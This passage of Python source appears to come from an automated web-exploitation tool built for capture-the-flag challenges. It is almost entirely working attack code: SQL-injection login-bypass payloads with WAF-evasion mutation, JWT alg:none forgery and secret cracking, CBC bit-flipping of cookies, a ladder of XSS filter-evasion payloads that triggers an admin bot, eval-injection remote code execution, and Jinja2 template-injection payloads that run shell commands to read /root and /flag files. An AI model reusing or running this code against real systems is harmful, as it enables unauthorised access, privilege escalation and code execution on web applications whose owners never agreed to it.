        """Active SQLi & Auth Bypass prober with database error identification and WAF evasion."""
        print_info("Testing SQLi Auth Bypass Vectors...")
        for form in self.state["forms"]:
            action = form["action"]
            method = form["method"]
            inputs = [i["name"] for i in form["inputs"] if i.get("type") not in ["submit", "button"]]
            
            if len(inputs) >= 1:
                auth_payloads = ["' OR 1=1-- -", "admin'-- -", "admin'#", "' OR '1'='1", "admin'/**/OR/**/1=1#"]
                
                # Add leaked passwords/secrets to auth payloads
                for sec in self.state.get("leaked_secrets", {}).values():
                    if sec not in auth_payloads:
                        auth_payloads.append(sec)
                        auth_payloads.append(f"admin' AND password='{sec}'-- -")

                for p in auth_payloads:
                    data = {name: p for name in inputs}
                    try:
                        if method == "POST":
                            r = self.session.post(action, data=data, timeout=15)
                        else:
                            r = self.session.get(action, params=data, timeout=15)
                            
                        # Cognitive response analysis for SQL errors
                        diag = ResponseAnalyzer.analyze_response(r.text, r.status_code, dict(r.headers), probe_sent=p)
                        
                        if diag["waf_detected"]:
                            print_warning(f"WAF detected for SQLi payload '{p}'. Engaging BypassEngine...")
                            mutated = BypassEngine.mutate_sqli(p, level=3)
                            for m in mutated:
                                if m["payload"] not in auth_payloads:
                                    auth_payloads.append(m["payload"])
                                    
                        if diag["db_errors"]:
                            summary = ResponseAnalyzer.format_diagnostic_summary(diag)
                            if summary:
                                console.print(summary)

                        # Check if authenticated or flag found
                        self._check_and_store_flags(r.text, f"SQLi Auth Bypass ({action})")
                        if r.status_code in [302, 301] or any(k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout"]):
                            print_success(f"SQLi Authentication Bypass Succeeded on Form [bold yellow]{action}[/bold yellow] via '{p}'!")
                            self._log_step("Phase 4: Exploitation", f"SQLi Auth Bypass on {action}", curl_cmd=f"curl -X {method} {action} -d '{inputs[0]}={p}'")
                            self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "sqli", "auth_bypass", p, list(self.state["captured_flags"]))
                            break
                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                        pass

    def _exploit_jwt(self):
        """Active JWT None-Algorithm and Secret Cracker."""
        for cname, token in self.state["jwt_tokens"]:
            # 1. Test alg: none
            none_token = forge_alg_none(token, {"role": "admin", "user": "admin", "isAdmin": True})
            try:
                r = self.session.get(self.target_url, cookies={cname: none_token}, timeout=15)
                self._check_and_store_flags(r.text, "JWT Alg:None Response")
                if "admin" in r.text.lower() or "flag" in r.text.lower():
                    print_success(f"JWT Alg:None Bypass Succeeded on cookie '{cname}'!")
                    self.session.cookies.set(cname, none_token)
                    self._log_step("Phase 4: Exploitation", "JWT alg:none forged admin token")
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass

            # 2. Test weak secret brute force and leaked secrets
            cracked = bruteforce_secret(token)
            if not cracked:
                cracked = self.state.get("leaked_secrets", {}).get("secret_key")
            
            if cracked:
                print_success(f"JWT Secret Key Cracked: [bold green]{cracked}[/bold green]")
                self.state["leaked_secrets"]["jwt_secret"] = cracked
                self._log_step("Phase 4: Exploitation", f"Cracked JWT Secret: {cracked}")
                
                # Exploit it to get the flag!
                try:
                    from modules.jwt_tool import sign_jwt_hs256
                    forged = sign_jwt_hs256({}, {"role": "admin", "user": "admin", "isAdmin": True}, cracked)
                    r = self.session.get(self.target_url, cookies={cname: forged}, timeout=15)
                    self._check_and_store_flags(r.text, "JWT Cracked Secret Response")
                    if "admin" in r.text.lower() or "flag" in r.text.lower():
                        print_success(f"JWT Cracked Bypass Succeeded on cookie '{cname}'!")
                        self.session.cookies.set(cname, forged)
                        self._log_step("Phase 4: Exploitation", "JWT cracked secret forged admin token")
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    print_error(f"Failed to forge and use cracked JWT: {e}")

    def _exploit_cbc_bitflip(self):
        """
        CBC Bit Flipping Attack on encrypted cookies.
        Detects cookies that are base64-encoded and contain XOR-encrypted JSON
        (like picoCTF 'More Cookies'). Flips bits to change 'false' to 'true'
        or 'guest' to 'admin' to gain privileged access.
        """
        print_info("Testing CBC Bit-Flipping on encrypted cookies...")
        cookies = self.state.get("cookies", {})
        if not cookies:
            return

        from base64 import b64decode, b64encode
        import json as _json

        for cname, cval in cookies.items():
            # Skip known non-encrypted cookies (session, jwt already handled)
            if cname.lower() in ("session", "jwt", "token", "csrf", "flask"):
                continue

            # Try to decode base64 once - if it fails, skip
            try:
                decoded = b64decode(cval)
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                continue

            # Check if decoded data looks like encrypted JSON (not plaintext)
            # Encrypted data has high entropy / non-printable bytes
            if len(decoded) < 16:
                continue

            # Check if it's already plaintext JSON (no need to bit-flip)
            try:
                plain = decoded.decode("utf-8")
                if "{" in plain and "}" in plain:
                    continue  # Already plaintext, not encrypted
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass  # Binary data - likely encrypted, good candidate

            # Check for common JSON markers in the decrypted content
            # The cookie likely contains {"admin": false, "username": "guest"}
            # We look for the pattern by checking if flipping bits reveals JSON
            print_info(f"[bold cyan]{cname}[/bold cyan] cookie looks encrypted ({len(decoded)} bytes) - attempting CBC bit-flip...")

            # Strategy: flip each bit in each byte position, send request,
            # check if response reveals admin access or flag.
            # To be efficient, we focus on the first 32 bytes (where JSON keys
            # like "admin" and "false" typically appear) and try all 128 bit values.
            max_pos = min(len(decoded), 32)
            found = False
            for pos in range(max_pos):
                for bit_val in range(128):
                    altered = bytearray(decoded)
                    altered[pos] = altered[pos] ^ bit_val
                    altered_b64 = b64encode(bytes(altered)).decode("utf-8")
                    try:
                        r = self.session.get(self.target_url, cookies={cname: altered_b64}, timeout=15)
                        text = r.text.lower()
                        # Flag found
                        if "picoctf{" in text or "flag{" in text or "ctf{" in text:
                            print_success(f"CBC Bit-Flip SUCCESS on cookie '{cname}' (pos={pos}, bit={bit_val})!")
                            self._check_and_store_flags(r.text, f"CBC Bit-Flip ({cname})")
                            self._log_step(
                                "Phase 4: Exploitation",
                                f"CBC Bit-Flip attack succeeded on cookie {cname}",
                                details=f"Position: {pos}, Bit: {bit_val}",
                                curl_cmd=f"curl -s -H 'Cookie: {cname}={altered_b64}' {self.target_url}"
                            )
                            self.learning_engine.record_success(
                                self.target_url, self.state["tech_stack"], "cbc_bitflip", "cookie_manipulation",
                                f"pos={pos},bit={bit_val}", list(self.state["captured_flags"])
                            )
                            found = True
                            break
                        # Admin access gained (different response than baseline)
                        elif "admin" in text and "guest" not in text and len(text) > 100:
                            # Check if response changed significantly from baseline
                            baseline_len = len(self.state.get("baseline_html", ""))
                            if abs(len(r.text) - baseline_len) > 50:
                                print_success(f"CBC Bit-Flip changed response on cookie '{cname}' (pos={pos}, bit={bit_val})!")
                                self._check_and_store_flags(r.text, f"CBC Bit-Flip Response ({cname})")
                                self._log_step(
                                    "Phase 4: Exploitation",
                                    f"CBC Bit-Flip altered response on cookie {cname}",
                                    details=f"Position: {pos}, Bit: {bit_val}"
                                )
                                found = True
                                break
                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                        continue
                if found:
                    break

            if not found:
                print_info(f"No flag via CBC bit-flip on '{cname}' (checked {max_pos} positions).")

    def _exploit_client_side_crypto(self):
        """Active Client-Side JS Analysis, Auth Extraction, Deobfuscation & Scrambled Asset Reconstruction."""
        print_info("Testing Client-Side Cryptographic, JS Logic & Scrambled Asset Vectors...")
        html = self.state.get("baseline_html", "")
        
        # 1. Advanced Client-Side JavaScript Logic, Auth Checks & Deobfuscation
        scripts_to_analyze = []
        for s_url in self.state.get("scripts", []):
            try:
                r_js = self.session.get(s_url, timeout=15)
                if r_js.status_code == 200 and r_js.text:
                    script_name = s_url.split("/")[-1] or "external.js"
                    self.state["leaked_source_files"][script_name] = r_js.text
                    scripts_to_analyze.append((script_name, r_js.text, s_url))
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass
        
        for idx, inl_js in enumerate(self.state.get("inline_scripts", [])):
            if inl_js.strip():
                scripts_to_analyze.append((f"inline_script_{idx+1}.js", inl_js, self.target_url))

        for name, js_code, source_url in scripts_to_analyze:
            analysis = ClientSideAnalyzer.analyze_javascript(js_code, name)
            
            # Check flags in JS code
            for f in analysis.get("flags", []):
                self._check_and_store_flags(f, f"JavaScript Analysis ({name})")

            # Check hardcoded auth credentials
            for cred in analysis.get("auth_credentials", []):
                u = cred.get("username", "")
                p = cred.get("password", "")
                print_success(f"Discovered Client-Side Hardcoded Auth in [bold cyan]{name}[/bold cyan] -> User: [bold yellow]{u}[/bold yellow] | Pass: [bold green]{p}[/bold green]")
                self.state["leaked_secrets"][f"client_auth_{name}"] = f"{u}:{p}"
                
                # Check if the password itself is a flag or validation key
                self._check_and_store_flags(p, f"Client-Side Auth Credential ({name})")
                self._check_and_store_flags(f"flag{{{p}}}", f"Client-Side Auth Credential ({name})")
                
                # Also directly record the password as a validation flag candidate
                if len(p) >= 3 and not any(p in cf for cf in self.state["captured_flags"]):
                    self.state["captured_flags"].add(p)
                    print_flag(p)
                    self._log_step("Phase 7: Flag Capture", f"Captured client-side challenge password/flag: {p}")
                
                self.learning_engine.record_success(
                    self.target_url, self.state["tech_stack"], "client_side_auth", "js_hardcoded_check", f"{u}:{p}", list(self.state["captured_flags"])
                )

                # Attempt automatic form submission with discovered credentials
                for form in self.state.get("forms", []):
                    action_url = form.get("action", self.target_url)
                    method = form.get("method", "POST")
                    form_data = {}
                    for inp in form.get("inputs", []):
                        iname = inp.get("name", "")
                        if iname:
                            if any(k in iname.lower() for k in ["user", "pseudo", "login", "name", "id"]):
                                form_data[iname] = u
                            elif any(k in iname.lower() for k in ["pass", "pwd", "key", "token"]):
                                form_data[iname] = p
                            else:
                                form_data[iname] = inp.get("value", "")
                    if form_data:
                        try:
                            if method == "POST":
                                r_sub = self.session.post(action_url, data=form_data, timeout=15)
                            else:
                                r_sub = self.session.get(action_url, params=form_data, timeout=15)
                            self._check_and_store_flags(r_sub.text, f"Authenticated Form Submission ({action_url})")
                            
                            # Follow hidden forms in the response (multi-step auth flows)
                            self._follow_hidden_forms(r_sub.text, action_url, f"Client-Side Auth ({name})")
                        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                            pass

            # Check deobfuscated strings
            for s in analysis.get("charcodes", []) + analysis.get("atob_strings", []) + analysis.get("unescaped", []) + analysis.get("reversed_strings", []) + analysis.get("hex_decoded", []) + analysis.get("xor_recovered", []):
                self._check_and_store_flags(s, f"Deobfuscated JS String ({name})")
                if len(s) >= 4 and any(kw in s.lower() for kw in ["pass", "flag", "secret", "root", "admin"]):
                    self.state["leaked_secrets"][f"deobfuscated_{name}"] = s

        # 2. Look for referenced byte endpoints or inline byte arrays
        byte_endpoints = re.findall(r"[\"']([a-zA-Z0-9_\-\.\/]*bytes[a-zA-Z0-9_\-\.\/]*)[\"']", html, re.IGNORECASE)
        for ep in ["bytes", "data", "image_data", "flag_data", "raw_bytes"]:
            if ep not in byte_endpoints:
                byte_endpoints.append(ep)
                
        for bep in byte_endpoints:
            full_bep = urljoin(self.target_url, bep)
            try:
                r_bytes = self.session.get(full_bep, timeout=15)
                if r_bytes.status_code == 200 and len(r_bytes.text) > 50:
                    raw_text = r_bytes.text.strip()
                    tokens = re.split(r"[\s,]+", raw_text)
                    if len(tokens) >= 64 and all(t.isdigit() for t in tokens[:50]):
                        bytes_list = [int(t) for t in tokens if t.isdigit()]
                        print_info(f"Discovered {len(bytes_list)} scrambled bytes at [bold cyan]{full_bep}[/bold cyan]!")
                        
                        # Target PNG Magic header + IHDR
                        header_16 = [137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82]
                        LEN = 16
                        num_rows = len(bytes_list) // LEN
                        
                        if num_rows >= 2:
                            candidates = []
                            for i in range(LEN):
                                target_val = header_16[i]
                                found = [s for s in range(num_rows) if bytes_list[(s * LEN) + i] == target_val]
                                candidates.append(found if found else [0])
                            
                            for combo in itertools.product(*candidates):
                                result = [0] * len(bytes_list)
                                for i in range(LEN):
                                    shifter = combo[i]
                                    for j in range(num_rows):
                                        result[(j * LEN) + i] = bytes_list[(((j + shifter) * LEN) % len(bytes_list)) + i]
                                
                                while result and result[-1] == 0:
                                    result.pop()
                                    
                                png_data = bytes(result)
                                try:
                                    img = Image.open(io.BytesIO(png_data))
                                    img.load()
                                    key_str = ''.join([chr(s + 48) for s in combo])
                                    print_success(f"Successfully Reconstructed Scrambled PNG with Key: [bold green]{key_str}[/bold green]!")
                                    
                                    # Save recovered image to loot
                                    loot_img_path = LootManager.save_loot_file(self.target_url, "recovered_flag.png", png_data)
                                    print_info(f"Saved reconstructed image to: {loot_img_path}")
                                    
                                    # Decode QR Code
                                    try:
                                        from pyzbar.pyzbar import decode
                                        decoded_objs = decode(img)
                                        for d in decoded_objs:
                                            decoded_text = d.data.decode("utf-8", errors="ignore")
                                            print_info(f"QR Code Decoded Content: [bold cyan]{decoded_text}[/bold cyan]")
                                            self._check_and_store_flags(decoded_text, "Reconstructed QR Code")
                                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                                        pass
                                    
                                    # Extract strings from PNG data
                                    self._check_and_store_flags(png_data.decode("latin1", errors="ignore"), "PNG Metadata")
                                    
                                    if len(self.state["captured_flags"]) > 0:
                                        self._log_step("Phase 4: Exploitation", f"Solved Scrambled PNG & Decoded QR Code (Key: {key_str})")
                                        self.learning_engine.record_success(
                                            self.target_url, self.state["tech_stack"], "client_crypto", "png_scrambler", key_str, list(self.state["captured_flags"])
                                        )
                                        return
                                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                                    pass
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass


    def _exploit_xss_to_admin(self):
        """
        Detect & exploit XSS-to-Admin challenges (forum / message-board + admin bot / report endpoint).
        Strategy:
          1. Detect a "report to admin" / "contact admin" / "send to admin" endpoint or form.
          2. Detect a message/comment/post submission form (stored XSS sink).
          3. Probe the sink for reflection & filter behavior (blocked payloads => "Hacker detected").
          4. Iterate OWASP filter-evasion payloads, escalating from simple to polyglot/mXSS.
          5. On a payload that survives the filter, submit it, then trigger the admin bot.
          6. Record the winning technique in the learning engine so future challenges reuse it.
        """
        print_info("Testing XSS-to-Admin (Stored XSS + Admin Bot) Vectors...")
        html = self.state.get("baseline_html", "")
        if not html:
            return

        # --- 1. Detect admin-bot / report endpoints -----------------------------------------
        report_endpoints = []
        for ep in self.state.get("endpoints", []):
            el = ep.lower()
            if any(k in el for k in ["report", "contact", "admin", "bot", "visit", "submit", "send"]):
                report_endpoints.append(ep)
        # Also scan the baseline HTML for report links/forms
        for m in re.findall(r'(?:href|action)\s*=\s*["\']([^"\']*(?:report|contact|admin|bot|visit)[^"\']*)["\']', html, re.IGNORECASE):
            report_endpoints.append(urljoin(self.target_url, m))
        report_endpoints = list(dict.fromkeys(report_endpoints))

        # --- 2. Detect message/comment/post submission forms (stored XSS sink) --------------
        sink_forms = []
        for f in self.state.get("forms", []):
            names = [i.get("name", "").lower() for i in f.get("inputs", [])]
            if any(k in n for n in names for k in ["message", "comment", "post", "content", "text", "msg", "body", "title", "subject"]):
                sink_forms.append(f)
        # Fallback: any form with a textarea or text input
        if not sink_forms:
            for f in self.state.get("forms", []):
                if any(i.get("type") in ("textarea", "text") for i in f.get("inputs", [])):
                    sink_forms.append(f)

        # --- 3. Determine if this looks like an XSS-to-admin challenge ----------------------
        is_forum = any(k in html.lower() for k in ["forum", "message", "comment", "guestbook", "post", "thread", "board"])
        has_admin_bot = bool(report_endpoints)
        if not (is_forum or has_admin_bot):
            # Still try if there is any text sink form
            if not sink_forms:
                return

        # --- 4. OWASP filter-evasion payload ladder (ordered by subtlety) -------------------
        payload_ladder = [
            # 0. Plain (baseline / filter confirmation)
            "<script>alert(1)</script>",
            # 1. Case / whitespace / newline obfuscation
            "<ScRiPt>alert(1)</sCrIpT>",
            "<script\n>alert(1)</script>",
            "<script\t>alert(1)</script>",
            # 2. HTML entity encoding
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
            # 3. Event handlers on benign tags
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            # 4. javascript: URI in attributes
            "<a href=javascript:alert(1)>x</a>",
            "<iframe src=javascript:alert(1)>",
            # 5. Tag-name / attribute obfuscation
            "<svg/onload=alert(1)>",
            "<img src=x onerror=&#97;lert(1)>",
            "<img src=x onerror=alert&#40;1&#41;>",
            "<img src=x onerror=alert(1)//",
            # 6. Null byte / tab / newline inside tag
            "<img%0Asrc=x%0Aonerror=alert(1)>",
            "<img src=x onerror=alert(1)%00>",
            # 7. mXSS / polyglot
            "<svg><script>alert(1)</script></svg>",
            "<math><mtext><script>alert(1)</script></mtext></math>",
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
            # 8. Double-encoding / nested
            "%253Cscript%253Ealert(1)%253C/script%253E",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            # 9. CSS / style-based
            "<div style=\"background:url(javascript:alert(1))\">x</div>",
            "<style>@import 'javascript:alert(1)';</style>",
            # 10. SVG foreignObject
            "<svg><foreignObject><iframe src=javascript:alert(1)></iframe></foreignObject></svg>",
        ]

        # --- 5. Probe the sink for reflection & filter behavior ------------------------------
        def _probe_sink(form, payload):
            """Submit payload to a sink form; return (response_text, blocked)."""
            action_url = form.get("action", self.target_url)
            method = form.get("method", "POST")
            data = {}
            for inp in form.get("inputs", []):
                iname = inp.get("name", "")
                if not iname:
                    continue
                if any(k in iname.lower() for k in ["message", "comment", "post", "content", "text", "msg", "body", "title", "subject"]):
                    data[iname] = payload
                else:
                    data[iname] = inp.get("value", "")
            try:
                if method.upper() == "POST":
                    r = self.session.post(action_url, data=data, timeout=6)
                else:
                    r = self.session.get(action_url, params=data, timeout=6)
                blocked = any(k in r.text.lower() for k in ["hacker detected", "forbidden", "blocked", "invalid input", "attack detected"])
                return r.text, blocked
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                return "", True

        # --- 6. Iterate payloads, escalating ------------------------------------------------
        winning_payload = None
        winning_form = None
        for form in sink_forms:
            for payload in payload_ladder:
                resp_text, blocked = _probe_sink(form, payload)
                if blocked:
                    continue
                # Payload survived the filter. Check if it reflected (stored XSS likely).
                # A stored XSS won't reflect immediately; check for success indicators.
                if any(k in resp_text.lower() for k in ["success", "posted", "sent", "added", "thank", "message", "comment"]):
                    winning_payload = payload
                    winning_form = form
                    print_success(f"XSS payload survived filter & was accepted: [bold green]{payload}[/bold green]")
                    break
            if winning_payload:
                break

        # --- 7. Trigger admin bot if we have a winning payload ------------------------------
        if winning_payload and report_endpoints:
            print_info(f"Triggering admin bot via [bold cyan]{report_endpoints[0]}[/bold cyan]...")
            for rep in report_endpoints:
                try:
                    r = self.session.get(rep, timeout=6)
                    self._check_and_store_flags(r.text, f"Admin Bot Response ({rep})")
                    # Some bots accept a POST with the URL to visit
                    if r.status_code == 405 or "method" in r.text.lower():
                        r2 = self.session.post(rep, data={"url": self.target_url, "link": self.target_url}, timeout=6)
                        self._check_and_store_flags(r2.text, f"Admin Bot POST ({rep})")
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass

        # --- 8. Record learning --------------------------------------------------------------
        if winning_payload:
            self._log_step("Phase 4: Exploitation", f"XSS-to-Admin payload accepted: {winning_payload}")
            self.learning_engine.record_success(
                self.target_url, self.state["tech_stack"], "xss_to_admin", "filter_evasion",
                winning_payload, list(self.state["captured_flags"]),
                chain_steps=["detect_report_endpoint", "submit_stored_xss", "trigger_admin_bot"]
            )
        else:
            # Record the filter behavior so future runs know this target blocks obvious payloads
            self.learning_engine.record_failure(
                self.target_url, self.state["tech_stack"], ["xss_to_admin"],
                reason="XSS filter blocked all tested evasion payloads"
            )


    def _exploit_php_tricks(self):
        """Active PHP Type Juggling, Header/IP Spoofing, Stream Wrappers and Verb Tampering."""
        print_info("Testing PHP-Specific Logic & Type Juggling Vectors...")
        
        # 1. Test Form Type Juggling & Array Injection
        for form in self.state.get("forms", []):
            PHPTricksEngine.test_type_juggling_form(
                self.session, form, lambda text, ctx: self._check_and_store_flags(text, ctx)
            )

        # 2. Test HTTP Header & IP Spoofing
        PHPTricksEngine.test_header_spoofing(
            self.session, self.target_url, lambda text, ctx: self._check_and_store_flags(text, ctx)
        )

        # 3. Test HTTP Verb Tampering
        PHPTricksEngine.test_verb_tampering(
            self.session, self.target_url, lambda text, ctx: self._check_and_store_flags(text, ctx)
        )

        # 4. Test PHP Stream Wrappers (php://input, data://, php://filter)
        PHPTricksEngine.test_php_wrappers(
            self.session, self.target_url, list(self.state.get("parameters", [])),
            lambda text, ctx: self._check_and_store_flags(text, ctx)
        )

    def _exploit_eval_injection(self):
        """Active server-side eval() / code injection RCE exploiter (Python, Node.js, PHP, Ruby)."""
        rce_achieved = EvalInjectionEngine.detect_and_exploit(
            session=self.session,
            target_url=self.target_url,
            forms=self.state.get("forms", []),
            parameters=list(self.state.get("parameters", [])),
            endpoints=list(self.state.get("endpoints", [])),
            tech_stack=self.state.get("tech_stack", []),
            flag_checker=lambda text, ctx: self._check_and_store_flags(text, ctx),
            state=self.state,
        )
        if rce_achieved:
            self._log_step("Phase 4: Exploitation", "Eval/Code Injection RCE achieved and flag extracted")
            self.learning_engine.record_success(
                self.target_url, self.state["tech_stack"], "eval_injection", "eval_rce",
                "eval() code injection", list(self.state["captured_flags"])
            )

    def _trigger_chains_from_exploitation(self):
        """
        Trigger the Vulnerability Chaining Engine from ACTIVE exploitation results,
        not just leaked source files. Uses captured flags, RCE availability, leaked
        secrets, and admin access to build and execute secondary exploit chains.
        """
        feedback = self.state.get("exploitation_feedback", {})
        captured_flags = feedback.get("captured_flags", []) or list(self.state.get("captured_flags", []))
        has_rce = feedback.get("active_rce_method") or bool(self.state.get("active_rce_method"))
        leaked_secrets = feedback.get("leaked_secrets", {}) or self.state.get("leaked_secrets", {})
        admin_accessible = feedback.get("admin_accessible") or self.state.get("admin_accessible")
        chain_results = feedback.get("chain_results", {}) or self.state.get("reasoning_chain_results", {})

        # Only trigger if we have meaningful exploitation progress
        if not (captured_flags or has_rce or leaked_secrets or admin_accessible or chain_results):
            return

        print_info("Triggering Chaining Engine from Active Exploitation Results...")

        # ── 1. If we have RCE, chain it into deeper flag hunting ─────────
        if has_rce:
            print_info("RCE available - chaining into deep flag extraction & system exploration...")
            try:
                out = self.state["active_rce_method"](
                    "cat /flag* /flag.txt /root/flag.txt /root/root.txt /home/*/*flag* /app/flag* 2>/dev/null; "
                    "find / -name '*flag*' -exec cat {} + 2>/dev/null"
                )
                self._check_and_store_flags(out, "Chained RCE flag hunt")
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass

        # ── 2. If we have leaked secrets, chain into session forgery ────
        if leaked_secrets.get("secret_key") or leaked_secrets.get("jwt_secret"):
            secret = leaked_secrets.get("secret_key") or leaked_secrets.get("jwt_secret")
            print_info(f"Leaked secret available - chaining into session forgery ({secret[:8]}...)...")
            try:
                forged = sign_jwt_hs256({}, {"user": "admin", "role": "admin", "isAdmin": True}, secret)
                for path in ["/admin", "/admin/dashboard", "/dashboard", "/flag", "/admin/flag", "/panel"]:
                    try:
                        r = self.session.get(urljoin(self.target_url, path),
                                             cookies={"session": forged, "jwt": forged, "token": forged}, timeout=15)
                        self._check_and_store_flags(r.text, f"Chained session forgery ({path})")
                        if r.status_code == 200:
                            print_success(f"Chained Admin Access via Forged Token: {path}")
                            self.state["admin_accessible"] = True
                            # Try SSTI in admin params
                            admin_parsed = extract_forms_and_links(r.text, urljoin(self.target_url, path))
                            for p in admin_parsed["parameters"]:
                                ssti_resp = self.session.get(
                                    urljoin(self.target_url, path),
                                    params={p: "{{ lipsum.__globals__['os'].popen('cat /flag* || cat /root/*flag*').read() }}"},
                                    cookies={"session": forged}, timeout=15)
                                self._check_and_store_flags(ssti_resp.text, f"Chained admin SSTI ({p})")
                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                        pass
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass

        # ── 3. If admin is accessible, chain into admin-only flag hunting ──
        if admin_accessible:
            print_info("Admin access available - chaining into admin-only flag hunting...")
            for path in ["/admin", "/admin/flag", "/flag", "/admin/dashboard", "/panel", "/admin/readflag"]:
                try:
                    r = self.session.get(urljoin(self.target_url, path), timeout=15)
                    self._check_and_store_flags(r.text, f"Chained admin flag ({path})")
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass

        # ── 4. If XSS payload was submitted, chain into admin bot exploitation ──
        if self.state.get("xss_payload_submitted") and not self.state.get("admin_bot_triggered"):
            print_info("Stored XSS submitted - chaining into admin bot trigger...")
            self._trigger_admin_bot()
            self._check_admin_bot_result()

        # ── 5. If chain results exist, log the completed chains ─────────
        if chain_results:
            for name, results in chain_results.items():
                done = sum(1 for r in results if r)
                print_info(f"  Chain '{name}': {done}/{len(results)} steps completed")
                self._log_step("Phase 5: Chaining", f"Chain '{name}' progress: {done}/{len(results)}",
                               details="; ".join(f"step{i+1}={'OK' if r else 'X'}" for i, r in enumerate(results)))

    # =========================================================================
    # PHASE 5: تصعيد الصلاحيات وربط الثغرات (Privilege Escalation & Chaining Core)
    # =========================================================================
    def phase5_privilege_escalation(self):
        print_header("المرحلة 5: تصعيد الصلاحيات وربط الثغرات", "Phase 5: Vulnerability Chaining & Privilege Escalation")

        # 0. Trigger chaining engine from ACTIVE exploitation results (not just leaked files)
        self._trigger_chains_from_exploitation()
        
        # 1. Multi-Stage Vulnerability Chaining Analysis on Leaked Files
        if self.state["leaked_source_files"]:
            print_info("Executing Vulnerability Chaining Engine on Leaked Source Code...")
            chains = VulnerabilityChainEngine.analyze_lfi_source_leak_for_chains(self.target_url, "file", self.state["leaked_source_files"])
            for ch in chains:
                print_success(f"Constructed Exploit Chain: [bold yellow]{ch['chain_name']}[/bold yellow] ({ch['impact']})")
                print_info(f"  Action: {ch['action']}")
                
                # If Deserialization chain discovered in source, execute payload immediately!
                if "payload" in ch and "sink_parameter" in ch:
                    try:
                        p_val = ch["payload"]
                        p_name = ch["sink_parameter"]
                        print_info(f"Triggering Deserialization Chain on parameter '{p_name}'...")
                        r_chain = self.session.get(self.target_url, params={p_name: p_val}, timeout=15)
                        self._check_and_store_flags(r_chain.text, f"Chained Exploit ({ch['chain_name']})")
                        
                        # Generate standalone Python script and save to loot
                        script_code = VulnerabilityChainEngine.generate_python_exploit_script(ch)
                        LootManager.save_loot_file(self.target_url, f"exploit_chain_{ch['source_file']}.py", script_code)
                        print_success(f"Reproducible Exploit Script saved to loot: exploit_chain_{ch['source_file']}.py")
                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                        pass

        # 2. Web PrivEsc: Check Leaked Source Code for Secret Keys & Forge Tokens
        for fname, content in self.state["leaked_source_files"].items():
            secrets = re.findall(r"(?:SECRET_KEY|JWT_SECRET|PASSWORD|ADMIN_KEY)\s*=\s*['\"]([^'\"]+)['\"]", content, re.IGNORECASE)
            for s in secrets:
                print_success(f"Extracted Secret Key from leaked {fname}: [bold yellow]{s}[/bold yellow]")
                self.state["leaked_secrets"]["secret_key"] = s
                
                forged_admin = sign_jwt_hs256({}, {"user": "admin", "role": "admin", "isAdmin": True}, s)
                for admin_path in ["/admin", "/admin/dashboard", "/dashboard", "/flag", "/admin/flag", "/panel"]:
                    admin_url = urljoin(self.target_url, admin_path)
                    try:
                        r_admin = self.session.get(admin_url, cookies={"session": forged_admin, "jwt": forged_admin, "token": forged_admin}, timeout=15)
                        self._check_and_store_flags(r_admin.text, f"Admin Area ({admin_path})")
                        if r_admin.status_code == 200:
                            print_success(f"Admin Access Granted via Forged Token on: [bold green]{admin_url}[/bold green]!")
                            self._log_step("Phase 5: PrivEsc", f"Privilege Escalation to Admin on {admin_path}", curl_cmd=f"curl -H 'Cookie: session={forged_admin}' {admin_url}")
                            
                            admin_parsed = extract_forms_and_links(r_admin.text, admin_url)
                            for admin_param in admin_parsed["parameters"]:
                                ssti_resp = self.session.get(admin_url, params={admin_param: "{{ lipsum.__globals__['os'].popen('cat /flag* || cat /root/*flag*').read() }}"}, cookies={"session": forged_admin}, timeout=15)
                                self._check_and_store_flags(ssti_resp.text, f"Admin SSTI ({admin_param})")
                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                        pass
